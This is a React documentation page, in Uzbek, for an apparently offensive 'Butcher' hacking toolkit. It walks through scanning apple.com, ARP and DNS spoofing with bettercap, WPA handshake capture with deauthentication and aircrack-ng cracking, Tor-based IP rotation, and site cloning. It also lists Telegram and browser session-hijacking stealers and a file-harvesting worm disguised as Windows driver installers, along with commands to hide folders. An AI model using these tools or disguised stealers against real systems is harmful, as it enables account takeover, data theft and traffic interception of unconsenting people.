import React, { useState } from 'react';
import { Wifi, Shield, Ghost, Menu, Globe, Wrench, FileCode, Search, User } from 'lucide-react';

export default function DocsPage() {
  const tools = [
    {
      id: 'Web Hacking',
      label: 'Web Hacking',
      icon: Globe,
      description: `Web Hacking moduli — 3ta bolimdan iborat bolib unda Subdomainlarni izlash Ochiq portlarni aniqlash va zaifliklarni aniqlash mumkin `,
      use_cases: [
        "Subdomain bu Asosiy domen ichidagi kichik bo‘lim.",
        "Portlar: Tarmoqqa xizmatlarni ulash nuqtasi.",
        "Zaifliklar: Xujumga ochiq tizim kamchiliklari."
      ],
      recommended_tools: ["butcher avtomatlashtirgan"],
      commands: [
        { purpose: "Web Hackingni tanlang", cmd: `
1) Web Hacking
2) Physical Hacking
3) WI-FI hacking
4) MITM (BITM)
5) WebCopier
6) R.I.P.B
7) Spidey Websint
8) Chiqish
kali-Butcher>_ : 1

          
          ` },
        { purpose: "Subdomainlarni tekshirish", cmd: `
Web Hacking

1) Subdomain aniqlash
2) Port skanerlash
3) Zaifliklarni aniqlash
4) Back
kali-Butcher>_ Enter choice [1-4]: 1

Subdomain aniqlash

root-Butcher>_ Maqsadli domenni kiriting (example.com): apple.com
Subdomain aniqlash natijalari

[OK] www.apple.com -> www-apple-com.v.aaplimg.com. (Status: 200) ✅
[DNS ONLY] autodiscover.apple.com -> mailpex.apple.com. (Status: 000) ❌
[DNS ONLY] mobile.apple.com -> mobile.apple.com.akadns.net. (Status: 000) ❌
[OK] beta.apple.com -> beta.v.aaplimg.com. (Status: 200) ✅
[OK] support.apple.com -> prod-support.apple-support.akadns.net. (Status: 200) ✅
[OK] shop.apple.com -> shop.lb-apple.com.akadns.net. (Status: 200) ✅
[DNS ONLY] lists.apple.com -> 17.32.208.205 (Status: 000) ❌




          
          ` },
        { purpose: "Portlarni tekshirish", cmd: `
Web Hacking

1) Subdomain aniqlash
2) Port skanerlash
3) Zaifliklarni aniqlash
4) Back
kali-Butcher>_ Enter choice [1-4]: 2

root-Butcher>_ Enter target IP/domain: apple.com # yoki ip raqamini kiriting
Scanning ports on apple.com...
torsocks -> nmap failed: WARN: you enabled following architectures: amd64 i386 but you 
have installed libtorsocks only for those archs: amd64. The best what you can do is to 
install libtorsocks for all enabled architectures. If you run torsocks with an executable 
from a missing architecture, the connections went directly into the internet and are
NOT redirected via Tor.
Falling back: running nmap without torsocks in TCP-connect mode (-sT -Pn).
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-02 02:02 +05
Nmap scan report for apple.com (17.253.144.10)
Host is up (0.020s latency).
Other addresses for apple.com (not scanned): 2620:149:af0::10
rDNS record for 17.253.144.10: apple.com.py
Not shown: 97 filtered tcp ports (no-response)
PORT    STATE  SERVICE
135/tcp closed msrpc
139/tcp closed netbios-ssn
445/tcp closed microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 2.27 seconds

Results saved to: WebPentest/PortScanResult/apple.com.txt
root-Butcher>_ Press Enter to continue...  # menuga otish uchun random tugmani bosing


          
          
          ` },
        { purpose: "Zaifliklarni tekshirish uchun", cmd: `
1) Subdomain aniqlash
2) Port skanerlash
3) Zaifliklarni aniqlash
4) Back
kali-Butcher>_ Enter choice [1-4]: 3          

Zaifliklarni aniqlash

1) Nikto                    # nikto yordamida zaifliklarni qidiradi
2) Nmap (Vuln scripts)      # nmap yordamida zaifliklarni qidiradi     
3) WhatWeb                  # whatWeb framework yordamida zaifliklarni qidiradi
4) WPScan                   # Wordpress saytlarni zaifliklarini qidiradi
root-Butcher>_ Select tool: 1
root-Butcher>_ Enter target domain (example.com): apple.com # zaiflik topmoqchi bolgan domain yoki 
subdomain kiritiladi

Running Nikto on apple.com...
WARN: you enabled following architectures: amd64 i386 but you have installed libtorsocks only 
for those archs: amd64. The best what you can do is to install libtorsocks for all enabled
architectures. If you run torsocks with an executable from a missing architecture,
the connections went directly into the internet and are NOT redirected via Tor.
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          17.253.144.10
+ Target Hostname:    apple.com
+ Target Port:        80
+ Start Time:         2025-10-02 02:08:53 (GMT5)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ /: Retrieved via header: http/1.1 deber5-edge-bx-021.ts.apple.com (acdn/260.16276).
+ /: The anti-clickjacking X-Frame-Options header is not present.
 See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Uncommon header 'cdnuuid' found, with contents: d3920bb2-da3d-4562-a204-7ee3f772ad0f-9267101789.
+ /: The X-Content-Type-Options header is not set. This could allow the user agent
 to render the content of the site in a different fashion to the MIME type.
  See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Root page / redirects to: https://www.apple.com/
^C
Results saved to: WebPentest/VulnerabilityScanResult/apple.com_20251002_020852.txt




          ` }
      ],
      output_dir: "barcha butcher qilgan natijalar Web Pentest Folderida saqlanadi Report uchun",
      artifacts: [
        "./WebPentest/subdomains.txt",
        "./WebPentest/Port Scaning result.txt",
        "./WebPentest/Vuln_results.txt"
      ]
    },

    {
      id: 'Physical Hacking',
      label: 'Physical Hacking',
      icon: Wrench,
      description: `Session hijacking: foydalanuvchi va server oʻrtasidagi sessiya tokeni (cookie yoki token) hujumchi tomonidan oʻgʻirlanib, hujumchi foydalanuvchi nomidan tizimga kirishi. Bir-ikki jumla: bu foydalanuvchining o‘rniga soxta harakat qilishga imkon beradi (ma’lumot ko‘rish, tranzaksiya qilish).

Data robber (data-stealer): qurilmadan yoki brauzerdan parollar, cookie, tokenlar, klaviatura yozuvlari yoki muhim fayllarni yashirincha yig‘ib, hujumchiga yuboradigan zararli dastur. Bir-ikki jumla: maqsad — shaxsiy va moliyaviy ma’lumotlarni tezda o‘g‘irlash va foydalanish.

      
      `,
      use_cases: [
        "Telegram Hijacking",
        "Media Robbers",
        "Pdf Robbers"
      ],
      commands: [
        { purpose: "scriptni yuklash jarayoni", cmd: `
Physical Hacking


📂 Current directory
Current directory: /home/kali/butchergit/butcher/tools/physical
0) Back
1) 📁 About malwares  # zararli dasturlar haqida qo'llanma
2) 📁 Linux Hacking   # Linux uchun zararli Dasturlar 
3) 📁 MacOs hacking   # Mac os uchun zararli Dasturlar
4) 📁 Windows Hacking # Windows uchun zararli dasturlar 
> Choose number
Choose number:4  

📂 Current directory
Current directory: /home/kali/butchergit/butcher/tools/physical/Windows Hacking
0) Back
1) 📁 Edge session hijacking     # Microsoft Edge browser session cookielarni og'irlash scriptlari
2) 📁 Google Session hijacking   # Google Chrome browser session cookielarni og'irlash scriptlari 
3) 📁 Telegram Session hijacking # Telegram sessiyasi o'girlaydigan scriptlar
4) 📁 Worms  # Mp3 Mp4 Jpg Png Pdf filelarni butun tizimdan qidirib script turgan joyga nusxalaydigan script
> Choose number
Choose number: 3

📂 Current directory
Current directory: /home/kali/butchergit/butcher/tools/physical/Windows Hacking/Telegram Session hijacking
0) Back
1) 📄 AX88772C_Win10_Driver.vbs 
2) 📄 DriverPack.vbs
3) 📄 ETD_Driver_Win10.vbs
4) 📄 High Definition Audio Codecs Software Drivers.vbs
5) 📄 Intel® Chipset Device Software Driver.vbs
6) 📄 Intel® Graphics – Windows® 10 DCH Drivers.vbs
7) 📄 MT7921_WLAN_Driver.vbs
8) 📄 Realtek_LAN_Win10_10.39.20.0.vbs
9) 📄 Synaptics_v19_0_19_1.vbs
10) 📄 WiFi_22.230.0_Driver64_Win10.vbs
> Choose number
Choose number: 2    # xohlagan raqam belgilanadi uni Malwares folderiga nusxalab beradi

✅ 'DriverPack.vbs' copied to
copied to /home/kali/butchergit/butcher/malwares/   # tanlangan script shu yerga tushadi

          
          
          ` },
        { purpose: "Yashirin folderni Ochish", cmd: "attrib -s -h Backup_telegram # tabni bossa yashirin folder korinadi" },
        { purpose: "folderni Yashrish", cmd: "attrib +s +h <foldername>" }
      ],
  
    },

    {
      id: 'Wifi Hacking',
      label: 'Wifi Hacking',
      icon: Wifi,
      description: `Fluxionning Butcher analogi Wifi handshakelar olish va buzish uchun ishlatiladi`,
     
         commands: [
        { purpose: "Foydalanish", cmd: `
BlindNet_header
[*] Select your language

	[1] en / English
	[2] ru / Русский
	[3] uz / O'zbekcha

[fluxion@kali]-[~] 3


[*] Bir variantni tanlang

                      ESSID: "[N/A]" / [N/A]                                    
                    Channel:  [N/A]                                             
                      BSSID:  [N/A] ([N/A])                          

	[1] Captive Portal "Evil Twin" (yovuz egizak) kirish nuqtasini yaratadi.
	[2] Handshake Snooper WPA/WPA2 shifrlash hash qiymatlarini oladi.
	[3] Orqaga 

[fluxion@kali]-[~] 2

BlindNet_header
[*] Maqsad qidiruvi uchun simsiz interfeysni tanlang.

[1] wlan0    [-] MEDIATEK Corp. MT7922 802.11ax PCI Express Wireless Network Ada
[2] Takrorlash                                                                    
[3] Orqaga                                                                    

[fluxion@kali]-[~] 1

[+] wlan0 interfeysi sozlanmoqda.
[*] Barcha simsiz interfeyslar blokdan chiqarilmoqda.
[*] Interfeys qayta nomlanmoqda.
[*] Monitor interfeysi ishga tushirilmoqda...
[*]  interfeys muvaffaqiyatli sozlandi.
BlindNet_header
[*] Kanalni tanlang

	[1] Barcha kanallar (2.4GHz)
	[2] Barcha kanallar (5GHz)
	[3] Barcha kanallar (2.4GHz & 5Ghz)
	[4] Aniq kanalda qidiring
	[5] Orqaga

[fluxion@kali]-[~] 2 # barcha Wifi BSSID larni korsatadi

[*] Skaner ishga tushirilmoqda, iltimos kuting...
[*] Maqsad access pointni ko‘rgandan 5 soniya keyin Fluxion Skanerini to‘xtating (ctrl+c).

                                   WI-FI lists
[ * ] ESSID                          QLTY PWR STA CH SECURITY              BSSID

[001] Galaxy A63C3D                   36% -79   0  1 WPA2      02:B5:D0:67:3C:3D
[002] Uy bozor                         0% -93   0  1 WPA2      BC:E0:01:3E:EE:FD

[fluxion@kali]-[~] 1

BlindNet_header
[*] Maqsadni kuzatish uchun simsiz interfeysni tanlang.
[*] Alohida simsiz interfeysni tanlash zarur bo‘lishi mumkin.
[*] Agar ishonchingiz komil bo‘lmasa, "O‘tkazish" ni tanlang!

[1] wlan0    [*] MEDIATEK Corp. MT7922 802.11ax PCI Express Wireless Network Ada
[2] O‘tkazish                                                                    
[3] Takrorlash                                                                    
[4] Orqaga                                                                    

[fluxion@kali]-[~] 1

[*] Handshake qo‘lga kiritish uchun usul tanlang

	[1] Monitor (passiv)
	[2] aireplay-ng deauthentication (agressiv) 
	[3] mdk4 deauthentication (agressiv) 
	[4] Orqaga

[fluxion@kali]-[~] 2

[*] Hash tasdiqlash usulini tanlang

	[1] aircrack-ng tasdiqlash (mos kelmaydi)
	[2] cowpatty tasdiqlash (tavsiya etiladi)
	[3] Orqaga

[fluxion@kali]-[~] 2

[*] Hashni tekshiruvchi qancha vaqt oralig‘ida tekshirsin?

	[1] Har 30 soniyada (tavsiya etiladi).
	[2] Har 60 soniyada.
	[3] Har 90 soniyada.
	[4] Orqaga

[fluxion@kali]-[~] 1

[*] Tekshirish jarayoni qanday amalga oshirilsin?

	[1] Asinxron (tez tizimlar uchun).
	[2] Sinxron (tavsiya etiladi).
	[3] Orqaga

[fluxion@kali]-[~] 2 # Hujum boshlanadi tugagandan kiyin habar beriladi






          
          
          ` },
        { purpose: "handshakeni crack qilish", cmd: `
kali@kali:~/butchergit/butcher$ ls
aboutmalware     languages.txt  physical.sh  settings  tools
fluxtionButcher  malwares       README.md    setup.sh  WebPentest
kali@kali:~/butchergit/butcher$ cd fluxtionButcher
kali@kali:~/butchergit/butcher/fluxtionButcher$ ls
attacks  _config.yml  language  logos  preferences  scripts
bin      fluxion.sh   lib       misc   README.md
kali@kali:~/butchergit/butcher/fluxtionButcher$ cd attacks/
kali@kali:~/butchergit/butcher/fluxtionButcher/attacks$ ls
'Captive Portal'  'Handshake Snooper'
kali@kali:~/butchergit/butcher/fluxtionButcher/attacks$ cd Handshake\ Snooper/
kali@kali:~/butchergit/butcher/fluxtionButcher/attacks/Handshake Snooper$ ls
attack.conf  attack.sh  handshakes  language
kali@kali:~/butchergit/butcher/fluxtionButcher/attacks/Handshake Snooper$ cd handshakes
kali@kali:~/butchergit/butcher/fluxtionButcher/attacks/Handshake Snooper/handshakes$ ls
Haad Students\:2E\:C1\:09\:F9\:6A.cap 
HowToCrackPassword      
kali@kali:~/butchergit/butcher/fluxtionButcher/attacks/Handshake Snooper/handshakes$ aircrack-ng  -w    /usr/share/wordlists/rockyou.txt  Haad Students\:2E\:C1\:09\:F9\:6A.cap

          
          ` },
      ],
  
    },
     {
      id: 'B.I.T.M (MITM)',
      label: 'B.I.T.M ',
      icon: User,
      description: `MITM (Man-in-the-Middle) — bu hujum turi bo‘lib, unda hujumchi ikkita tomon (masalan, foydalanuvchi va server) orasida turib, ularning aloqasini yashirincha kuzatadi, manipulyatsiya qiladi yoki o‘zgartirad`,
    
   
      commands: [
        { purpose: "BITMdan foydalanish", cmd: `
Asosiy menyu - Penetration Testing vositalari

1) Web Hacking
2) Physical Hacking
3) WI-FI hacking
4) MITM (BITM)
5) WebCopier
6) R.I.P.B
7) Spidey Websint
8) Chiqish
root-Butcher>_ : 4


██████╗    ██╗████████╗███╗   ███╗
██╔══██╗   ██║╚══██╔══╝████╗ ████║
██████╔╝   ██║   ██║   ██╔████╔██║
██╔══██╗   ██║   ██║   ██║╚██╔╝██║
██████╔╝██╗██║██╗██║██╗██║ ╚═╝ ██║
╚═════╝ ╚═╝╚═╝╚═╝╚═╝╚═╝╚═╝     ╚═╝

------------ Butcher In The Middle 
-------------- by Butcher hacktool

Language [uz/en/ru]: uz
--------------------------------
Tarmoqdagi qurilmalarni aniqlash...
--------------------------------
Aniqlangan qurilmalar:
 1) 192.168.100.0
 2) 192.168.100.1
 3) 192.168.100.137
 4) 192.168.100.139
 5) 192.168.100.147
 6) 192.168.100.149
 7) 192.168.100.40
 8) 192.168.100.54
 9) 192.168.100.8
 [a] ALL (set arp.spoof.all true)

Qaysi IP(lar)ni tanlaysiz? (1,3 yoki a): a
Interfeys (masalan eth0, bo‘sh qoldirsangiz default):wlan0 
1) Net sniffing (trafikni ko‘rish)
2) DNS spoofing
Bo‘limni tanlang (1 yoki 2): 1

bettercap…
Target: ALL

[sudo] password for kali: 

-----Sniffing Boshlandi------
[00:34:04] [sys.log] [inf] gateway monitor started ...
[00:34:04] [sys.log] [inf] net.probe starting net.recon as a requirement for net.probe
[00:34:04] [sys.log] [inf] net.probe probing 256 addresses on 192.168.100.0/24
[00:34:04] [sys.log] [inf] arp.spoof arp spoofer started, probing 256 targets.
[00:34:04] [endpoint.new] endpoint 192.168.100.63 detected as 14:d4:24:22:3b:44 (AzureWave Technology Inc.).
[00:34:04] [endpoint.new] endpoint 192.168.100.149 detected as ea:f4:53:15:bd:89.
[00:34:04] [endpoint.new] endpoint 192.168.100.40 detected as c2:fc:f4:df:e7:51.
[00:34:04] [endpoint.new] endpoint 192.168.100.147 detected as f6:6e:3a:63:fe:41.
[00:34:04] [endpoint.new] endpoint 192.168.100.8 detected as ca:c2:22:3e:48:5c.
[00:34:04] [endpoint.new] endpoint 192.168.100.137 detected as 22:3d:d3:0c:8c:4a.
[00:34:04] [endpoint.new] endpoint 192.168.100.54 detected as e2:88:76:60:b9:c8.
192.168.100.0/24 > 192.168.100.139  » [00:34:05] [net.sniff.mdns] mdns Android.local : Android.local is 192.168.100.137, 2a05:45c2:208a:9e00:203d:d3ff:fe0c:8c4a, fe80::203d:d3ff:fe0c:8c4a, 2a05:45c2:208a:9e00:3066:179d:5608:2dd9
192.168.100.0/24 > 192.168.100.139  » [00:34:05] [net.sniff.mdns] mdns fe80::203d:d3ff:fe0c:8c4a : Android.local is 192.168.100.137, 2a05:45c2:208a:9e00:203d:d3ff:fe0c:8c4a, fe80::203d:d3ff:fe0c:8c4a, 2a05:45c2:208a:9e00:3066:179d:5608:2dd9
192.168.100.0/24 > 192.168.100.139  »  



          ` },

          { purpose: "Dns Spoofing", cmd: `
Asosiy menyu - Penetration Testing vositalari

1) Web Hacking
2) Physical Hacking
3) WI-FI hacking
4) MITM (BITM)
5) WebCopier
6) R.I.P.B
7) Spidey Websint
8) Chiqish
root-Butcher>_ : 4


██████╗    ██╗████████╗███╗   ███╗
██╔══██╗   ██║╚══██╔══╝████╗ ████║
██████╔╝   ██║   ██║   ██╔████╔██║
██╔══██╗   ██║   ██║   ██║╚██╔╝██║
██████╔╝██╗██║██╗██║██╗██║ ╚═╝ ██║
╚═════╝ ╚═╝╚═╝╚═╝╚═╝╚═╝╚═╝     ╚═╝

------------ Butcher In The Middle 
-------------- by Butcher hacktool

Language [uz/en/ru]: uz
--------------------------------
Tarmoqdagi qurilmalarni aniqlash...
--------------------------------
Aniqlangan qurilmalar:
 1) 192.168.100.0
 2) 192.168.100.1
 3) 192.168.100.137
 4) 192.168.100.139
 5) 192.168.100.147
 6) 192.168.100.149
 7) 192.168.100.40
 8) 192.168.100.54
 9) 192.168.100.8
 [a] ALL (set arp.spoof.all true)

Qaysi IP(lar)ni tanlaysiz? (1,3 yoki a): a
Interfeys (masalan eth0, bo‘sh qoldirsangiz default):wlan0 
1) Net sniffing (trafikni ko‘rish)
2) DNS spoofing
Bo‘limni tanlang (1 yoki 2): 2
Spoof qilinadigan domain (masalan vulnweb.com): vulnweb.com # DNS SPOOFING FAQAT HTTP saytlarda ishlaydi 
[00:35:51] [sys.log] [inf] dns.spoof vulnweb.com -> 192.168.100.139



            
          ` },
      ],
 
    },
     {
      id: 'WebCopier',
      label: 'WebCopier',
      icon: FileCode,
      description: `WebCopier — bu veb-saytlarning frontend qismini (HTML, CSS, JavaScript) tez va oson nusxalashga imkon beruvchi dastur. U foydalanuvchiga saytning ko‘rinishini saqlab, o‘rganish, tahlil qilish yoki oflayn rejimda ishlatish imkonini beradi. Dastur xavfsiz va intuitiv interfeysga ega, shuningdek, turli brauzer va qurilmalarda ishlashni qo‘llab-quvvatlaydi..`,
  
      commands: [
        { purpose: "Ishlatish", cmd: `
WebCopier

kali-Butcher>_ Maqsadli domenni kiriting (example.com): example.com
WebCopier ishga tushyapti: example.com
Downloading frontend and assets into: WebClones/example.com_20251003_004319
--2025-10-03 00:43:19--  https://example.com/
Resolving example.com (example.com)... 2600:1406:5e00:6::17ce:bc12, 2600:1406:bc00:53::b81e:94c8, 2600:1406:bc00:53::b81e:94ce, ...
Connecting to example.com (example.com)|2600:1406:5e00:6::17ce:bc12|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1256 (1.2K) [text/html]
Saving to: ‘WebClones/example.com_20251003_004319/example.com/index.html’

example.com/index.html                                      100%[========================================================================================================================================>]   1.23K  --.-KB/s    in 0s      

2025-10-03 00:43:20 (22.7 MB/s) - ‘WebClones/example.com_20251003_004319/example.com/index.html’ saved [1256/1256]

FINISHED --2025-10-03 00:43:20--
Total wall clock time: 1.2s
Downloaded: 1 files, 1.2K in 0s (22.7 MB/s)
Converting links in WebClones/example.com_20251003_004319/example.com/index.html... nothing to do.
Converted links in 1 files in 0 seconds.
HTTPS download finished.

Sayt saqlandi: WebClones/example.com_20251003_004319

kali-Butcher>_ Press Enter to continue... 

# WebClones folderiga tushdi natija          


          ` },
       
      ],
     
    },
      {
      id: 'R.I.P.B',
      label: 'R.I.P.B',
      icon: Ghost,
      description: `R.I.P.B — anonimlik va operatsion izlarni kamaytirish uchun yordamchi modul. Trafikni proxylash va log konfiguratsiyasini boshqarish imkoniyatini beradi (ammo butunlay iz yo'q qilinmaydi).`,
    
      commands: [
        { purpose: "ishlatish", cmd: `
Asosiy menyu - Penetration Testing vositalari

1) Web Hacking
2) Physical Hacking
3) WI-FI hacking
4) MITM (BITM)
5) WebCopier
6) R.I.P.B
7) Spidey Websint
8) Chiqish
kali-Butcher>_ : 6

[sudo] password for kali: 
Sening IP'ing: 37.187.5.192
250 OK
250 OK
250 closing connection # har 10 sekunda bitta ip almashadi


          
          
          
          `},
      
      ],
      artifacts: [
        "Web Pentest bolimidan foydalanish uchun RIPB ni ishlatish majburiy "
      ]
    },
    {
      id: 'Spidey Websint',
      label: 'Spidey Websint',
      icon: Search,
      description: `Spidey Websint bu fuffda ishlaydigan veb fuzzer / directory brute-forcer yaʼni URL/fayl va papkalarni topish uchun soʻroqlar yuboradi`,
     
      commands: [
        { purpose: "Ishlatish", cmd: `Domen (masalan example.com/{BUTCH} : {BUTCH}.example.com/{BUTCH} ` },
      
      ],
    
    }
  ];

  
  const [selectedId, setSelectedId] = useState(tools[0].id);
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const selected = tools.find(t => t.id === selectedId) || tools[0];

  return (
    <>
      <div style={{ paddingTop: "100px" }} className="docs">
        <div className="container m-auto min-h-screen bg-black text-gray-100 flex flex-col pt-5">
          {/* Header */}
          <header className="flex items-center justify-between px-4 mb-4">
            <h1 className="text-2xl text-green-400 font-mono font-bold">DOKUMENTATSIYA</h1>
            <button className="lg:hidden p-2" onClick={() => setSidebarOpen(!sidebarOpen)}>
              <Menu className="w-6 h-6 text-green-400" />
            </button>
          </header>

          <div className="flex flex-1 overflow-hidden">
            {/* Sidebar */}
            <aside
              style={{ borderRadius: "12px" }}
              className={`bg-gray-900/90 w-64 border-r border-green-500/20 h-full overflow-y-auto fixed lg:static z-40 transform lg:translate-x-0 transition-transform duration-200 ${sidebarOpen ? 'translate-x-0' : '-translate-x-full'}`}
            >
              <ul className="p-4 space-y-2">
                {tools.map(tool => {
                  const Icon = tool.icon;
                  const active = tool.id === selectedId;
                  return (
                    <li key={tool.id}>
                      <button
                        onClick={() => { setSelectedId(tool.id); setSidebarOpen(false); }}
                        className={`w-full text-left flex items-start space-x-3 px-3 py-2 rounded-md ${active ? 'bg-green-800/30' : 'hover:bg-white/5'}`}
                      >
                        <Icon className="w-7 h-7 text-green-300 mt-1" />
                        <div>
                          <div className="font-mono font-semibold text-gray-100">{tool.label}</div>
                          <div className="text-sm text-gray-400">{(tool.use_cases && tool.use_cases[0]) || '—'}</div>
                        </div>
                      </button>
                    </li>
                  );
                })}
              </ul>
            </aside>

            {/* Overlay for mobile */}
            {sidebarOpen && <div onClick={() => setSidebarOpen(false)} className="fixed inset-0 bg-black/50 lg:hidden z-30"></div>}

            {/* Main content */}
            <main className="flex-1 p-6 overflow-y-auto ml-0 lg:ml-64">
              <h2 className="text-xl font-bold text-green-400 font-mono mb-3">{selected.label}</h2>

              <section className="mb-4">
                <h3 className="text-green-300 font-semibold mb-1">Tavsif</h3>
                <p className="text-gray-300">{selected.description || 'Tavsif mavjud emas.'}</p>
              </section>

              <section className="mb-4">
                <h3 className="text-green-300 font-semibold mb-1">Use cases</h3>
                {selected.use_cases && selected.use_cases.length > 0 ? (
                  <ul className="list-disc ml-6 text-gray-300">
                    {selected.use_cases.map((u, i) => <li key={`${selected.id}-use-${i}`}>{u}</li>)}
                  </ul>
                ) : (
                  <div className="text-gray-500">Hech qanday use case mavjud emas.</div>
                )}
              </section>

              <section className="mb-4">
                <h3 className="text-green-300 font-semibold mb-1">Tavsiya etilgan vositalar</h3>
                {selected.recommended_tools && selected.recommended_tools.length > 0 ? (
                  <div className="text-gray-300">{selected.recommended_tools.join(', ')}</div>
                ) : (
                  <div className="text-gray-500">Hech qanday tavsiya etilmagan.</div>
                )}
              </section>

              <section className="mb-4">
                <h3 className="text-green-300 font-semibold mb-1">Buyruqlar (commands)</h3>
                {selected.commands && selected.commands.length > 0 ? (
                  <div className="bg-gray-800 p-3 rounded">
                    {(selected.commands || []).map((c, i) => (
                      <div key={`${selected.id}-cmd-${i}`} className="mb-3">
                        <div className="text-sm text-yellow-300 font-semibold">{c.purpose || '—'}</div>
                        <pre className="bg-black/40 p-2 rounded text-sm text-gray-200 whitespace-pre-wrap">{c.cmd || ''}</pre>
                      </div>
                    ))}
                  </div>
                ) : (
                  <div className="text-gray-500">Buyruqlar mavjud emas.</div>
                )}
              </section>

              <section className="mb-4">
                <h3 className="text-green-300 font-semibold mb-1">Natija katalogi va artefaktlar</h3>
                <div className="text-gray-300">
                  Output dir: <span className="font-mono">{selected.output_dir ? selected.output_dir : <span className="text-gray-500">Yo‘q</span>}</span>
                </div>

                {selected.artifacts && selected.artifacts.length > 0 ? (
                  <ul className="list-disc ml-6 text-gray-300 mt-2">
                    {selected.artifacts.map((a, i) => <li key={`${selected.id}-art-${i}`} className="font-mono">{a}</li>)}
                  </ul>
                ) : (
                  <div className="text-gray-500 mt-2">Hech qanday artefakt ro‘yxati yo‘q.</div>
                )}
              </section>
            </main>
          </div>
        </div>
      </div>
    </>
  );
}